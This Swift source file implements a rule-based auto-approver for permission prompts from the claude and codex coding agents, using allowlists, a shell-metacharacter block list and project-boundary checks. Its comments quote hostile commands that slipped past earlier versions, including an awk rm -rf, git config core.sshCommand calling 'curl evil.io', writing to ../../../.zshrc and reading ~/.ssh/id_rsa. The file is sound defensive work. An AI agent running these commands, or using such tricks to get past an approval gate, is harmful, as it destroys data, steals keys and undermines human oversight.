import Foundation
import os

/// Decides, deterministically, whether a permission prompt from `claude` or
/// `codex` can be answered without waking the user.
///
/// ## Why no model does this
///
/// The obvious design is to hand the prompt to the local LLM and let it judge.
/// It is the wrong tool, and the reason is the failure mode rather than the
/// accuracy: a wrong "yes" on `rm -rf` destroys data irreversibly and silently,
/// and there is no signal afterwards that a mistake was made. A 4B model that is
/// right 99 times out of 100 is not a safety mechanism, it is a delay before an
/// accident. Judgement is also unauditable — you cannot read a rule and know
/// what it will do tomorrow.
///
/// So this file contains no inference. It approves only what it can *prove* has
/// no lasting effect, refuses everything else, and says which rule fired. The
/// bar is deliberately low: a command has to be boring to get through.
///
/// This mirrors the capability model in `CapabilityHostService` — name what is
/// allowed, never judge what was asked for.
enum ApprovalRuleService {

    enum Decision: Equatable {
        /// Provably side-effect-free. `rule` names why, for the audit log.
        case approve(rule: String)
        /// Anything not provably safe. `reason` is shown to the user.
        case ask(reason: String)
    }

    /// Commands that only read. Each is a whole argv[0]; a name is never matched
    /// as a prefix, so `catx` is not `cat`.
    /// `awk` and `sed` were on this list. Both are programming languages:
    /// `awk 'BEGIN{system("rm -rf src")}'` was measured to return APPROVE, and
    /// so was a variant that curls an SSH key to a remote host. A rule that
    /// approves a Turing-complete interpreter has not proved anything.
    private static let readOnly: Set<String> = [
        "ls", "cat", "head", "tail", "wc", "file", "stat", "du", "df",
        "pwd", "which", "type", "echo", "date", "uname", "whoami",
        "grep", "rg", "find", "fd", "diff", "sort", "uniq", "cut"
    ]

    /// `git` is only read-only in part, so it is allowlisted subcommand by
    /// subcommand. `git checkout` and `git clean` are absent on purpose: both
    /// destroy uncommitted work, which is the thing this codebase spends the
    /// most effort protecting.
    /// `config` was on this list, and `git config` WRITES. Measured:
    /// `git config --global core.sshCommand "curl evil.io"` returned APPROVE —
    /// a persistent execution primitive, outside the project, that fires on the
    /// next fetch. `git config --file=../../../.zshrc` wrote outside the
    /// project entirely, because `--file=` never looked like a path to the
    /// boundary check.
    private static let readOnlyGit: Set<String> = [
        "status", "log", "diff", "show", "branch", "remote", "ls-files",
        "rev-parse", "for-each-ref", "describe", "blame", "shortlog"
    ]

    /// Anything that lets one command become another. Their presence ends the
    /// analysis: the point of a rule is that it can be reasoned about, and a
    /// chained command cannot be.
    /// Anything that lets one command become another, or that this analyser
    /// cannot tokenise faithfully. Quotes and `$` are in the list because the
    /// tokeniser below splits on spaces: `cat "/etc/passwd"` and
    /// `cat $HOME/.ssh/id_rsa` both defeated the project boundary by hiding the
    /// real path from it. Rather than write a shell parser, refuse the input a
    /// shell parser would be needed for.
    /// Held as SCALARS, never as `String`. Both earlier attempts at this check
    /// rebuilt a `String` — from a `UnicodeScalarView`, then from `[Character]`
    /// — and Swift re-formed the grapheme clusters each time, so `;`+U+0301
    /// stayed one Character and `contains(";")` stayed false while bash read a
    /// plain `;`. The only reliable comparison is scalar to scalar.
    ///
    /// `&` and `|` cover `&&` and `||` on their own.
    private static let chainingScalars: Set<Unicode.Scalar> = [
        ";", "|", "&", "`", "$", ">", "<", "\"", "'", "{", "}", "\n", "\r", "\t", "\\"
    ]

    private static let log = Logger(subsystem: "com.lorislab.throttle", category: "approval")

    /// Decide on a detected prompt. `projectRoot` bounds every path argument:
    /// a command may only touch the project it was asked in.
    static func decide(prompt: String, projectRoot: String) -> Decision {
        guard let command = extractCommand(prompt) else {
            return .ask(reason: "no single command found in the prompt")
        }
        if let bad = command.unicodeScalars.first(where: { chainingScalars.contains($0) }) {
            return .ask(reason: "command contains the shell metacharacter `\(bad)`")
        }
        // Split on every shell whitespace, not just the space character:
        // `cat foo.txt\t/etc/passwd` hid a second path from the boundary check.
        let argv = command.split(whereSeparator: { $0 == " " || $0 == "\t" })
            .map(String.init)
        guard let head = argv.first else { return .ask(reason: "empty command") }

        // A binary given by path is not the binary of the same name on PATH.
        let name = head.contains("/") ? String(head.split(separator: "/").last ?? "") : head
        if head.contains("/"), !head.hasPrefix("/usr/bin/"), !head.hasPrefix("/bin/") {
            return .ask(reason: "runs a binary from an unusual path")
        }

        if name == "git" {
            guard argv.count > 1, readOnlyGit.contains(argv[1]) else {
                return .ask(reason: "git subcommand is not on the read-only list")
            }
        } else if !readOnly.contains(name) {
            return .ask(reason: "`\(name)` is not on the read-only list")
        }

        // `sed -i`, `find -delete` and `find -exec` read like reads and are not.
        // `-i.bak` edits in place too; an exact-match check missed it.
        if argv.contains(where: { $0 == "--in-place" || $0 == "-i" || $0.hasPrefix("-i.") }) {
            return .ask(reason: "edits files in place")
        }
        if name == "find", argv.contains(where: { ["-delete", "-exec", "-execdir", "-ok"].contains($0) }) {
            return .ask(reason: "find would run or delete something")
        }

        // Bound EVERY argument, and the value half of `--flag=value` too:
        // `--file=../../../.zshrc` never looked like a path, so it was never
        // bounded, and it wrote outside the project.
        for arg in argv.dropFirst() {
            for candidate in Self.pathCandidates(in: arg) where !within(candidate, root: projectRoot) {
                return .ask(reason: "touches `\(candidate)`, outside the project")
            }
        }
        return .approve(rule: name == "git" ? "read-only git (\(argv[1]))" : "read-only command (\(name))")
    }

    /// Pull the proposed command out of the prompt. Both harnesses print it on
    /// its own line after a `$`. More than one such line means more than one
    /// command, which this refuses rather than guesses at.
    private static func extractCommand(_ prompt: String) -> String? {
        var found: [String] = []
        prompt.enumerateLines { line, _ in
            let t = line.trimmingCharacters(in: .whitespaces)
            guard t.hasPrefix("$ ") else { return }
            found.append(String(t.dropFirst(2)).trimmingCharacters(in: .whitespaces))
        }
        guard found.count == 1, let only = found.first else { return nil }
        // The scraper truncates at ~137 chars and appends an ellipsis. Judging a
        // prefix while the shell runs the full line is not a decision, it is a
        // guess with a rule-shaped alibi.
        guard !only.hasSuffix("…"), !only.hasSuffix("...") else { return nil }
        return only
    }

    /// Every path-shaped token inside one argument. A bare word counts: the
    /// working directory is the project, so `notes.txt` is a path.
    private static func pathCandidates(in arg: String) -> [String] {
        if arg.hasPrefix("-") {
            guard let equals = arg.firstIndex(of: "=") else { return [] }
            let value = String(arg[arg.index(after: equals)...])
            return value.isEmpty ? [] : [value]
        }
        return arg.isEmpty ? [] : [arg]
    }

    /// A path argument is inside the project or it is not approved. Resolved
    /// before comparison, so `a/../../etc` is judged on where it lands.
    private static func within(_ arg: String, root: String) -> Bool {
        if arg.hasPrefix("~") { return false }     // home, not the project
        // Symlinks are resolved before comparison. `standardizedFileURL` alone
        // is textual, so a link committed inside the repo pointed anywhere and
        // still passed the prefix test.
        let base = URL(fileURLWithPath: root).resolvingSymlinksInPath().standardizedFileURL
        let raw = arg.hasPrefix("/")
            ? URL(fileURLWithPath: arg)
            : base.appendingPathComponent(arg)
        let target = raw.resolvingSymlinksInPath().standardizedFileURL
        let rootPath = base.path.hasSuffix("/") ? base.path : base.path + "/"
        return target.path == base.path || target.path.hasPrefix(rootPath)
    }

    // MARK: - Audit

    /// Every automatic answer is written down. A silent automation is one you
    /// cannot review, and this one answers on the user's behalf.
    static func recordApproval(project: String, command: String, rule: String) {
        log.info("auto-approved in \(project, privacy: .public): \(rule, privacy: .public)")
        let dir = FileManager.default.urls(for: .applicationSupportDirectory, in: .userDomainMask)[0]
            .appendingPathComponent("Throttle", isDirectory: true)
        try? FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        let line = [
            "ts": Int(Date().timeIntervalSince1970),
            "project": project, "rule": rule, "command": String(command.prefix(300))
        ] as [String: Any]
        guard let data = try? JSONSerialization.data(withJSONObject: line) else { return }
        let url = dir.appendingPathComponent("auto-approvals.jsonl")
        if let h = try? FileHandle(forWritingTo: url) {
            h.seekToEndOfFile(); h.write(data); h.write(Data([0x0a])); try? h.close()
        } else {
            guard let text = String(data: data, encoding: .utf8) else { return }
            try? (text + "\n").write(to: url, atomically: true, encoding: .utf8)
        }
    }
}
